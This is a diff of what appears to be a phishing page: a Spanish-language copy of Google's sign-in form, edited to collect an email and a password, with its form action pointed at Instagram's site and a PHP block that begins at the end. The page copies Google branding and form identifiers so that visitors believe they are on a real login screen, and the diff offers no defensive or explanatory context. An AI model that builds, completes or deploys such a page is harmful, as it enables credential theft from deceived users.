@@ -21,7 +21,7 @@
   font-family: 'Open Sans';
   font-style: normal;
   font-weight: 400;
-  src: url() format('truetype');
+  src: url(http://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFVZ0e.ttf) format('truetype');
 }
   </style>
   <style>
@@ -1287,7 +1287,7 @@
   
    no-name">
                     <img class="circle-mask" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
-                    <form novalidate method="post" action="" id="gaia_loginform">
+                    <form novalidate method="post" action="https://www.instagram.com/" id="gaia_loginform">
                         <div class="form-panel first valid" id="gaia_firstform">
                             <div class="slide-out">
                                 <div class="input-wrapper focused">
@@ -1295,8 +1295,7 @@
                                         <div>
                                             <label class="hidden-label" for="Email">Ingresa tu dirección de correo electrónico.</label>
                                             <input id="Email" type="email" value="" spellcheck="false" name="email" placeholder="Correo electrónico o teléfono" autofocus>
-                                            <label class="hidden-label" for="Email">Ingresa tu dirección de correo electrónico.</label>
-                                            <input id="Pasword" type="password" value="" spellcheck="false" name="contraseña" placeholder="Ingresa tu contraseña" autofocus>
+                                            <input id="Email" type="password" value="" spellcheck="false" name="contraseña" placeholder="Ingresa tu contraseña" autofocus>
 
                                             <input id="Passwd-hidden" type="password" spellcheck="false" class="hidden">
 											<?php 
